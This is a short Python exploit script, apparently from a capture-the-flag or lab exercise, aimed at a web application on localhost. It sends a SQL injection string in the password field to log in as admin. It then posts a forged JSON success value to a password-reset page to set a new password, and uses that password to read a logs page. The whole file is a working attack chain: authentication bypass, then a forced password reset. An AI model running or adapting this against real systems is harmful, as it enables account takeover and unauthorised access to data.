import requests
session = requests.Session()
url_index = 'http://127.0.0.1/'
data_index = {
    'username':'admin',
    'password':'1\' or 1=1 and id=\'10\' -- -'
}
r = session.post(url_index,data=data_index)
url_repassword = 'http://127.0.0.1/reset_password.php'
data_repassword ={
    "action": "reset",
    "data": '{"status":"success","message":"1"}', # 注意：这里的值本身是一个JSON字符串，所以要加引号
    "newpass": "123456"
}
rr = session.post(url_repassword,data=data_repassword)
print(rr.text)
# {"status":"success","message":"1"}
# action=reset&data={"status":"success","message":"1"}&newpass=123
url_logs = 'http://127.0.0.1/show_logs.php'
data_logs = {
    'username':'admin',
    'password':'123456'
}
rrr = session.post(url_logs,data=data_logs)
print(rrr.text)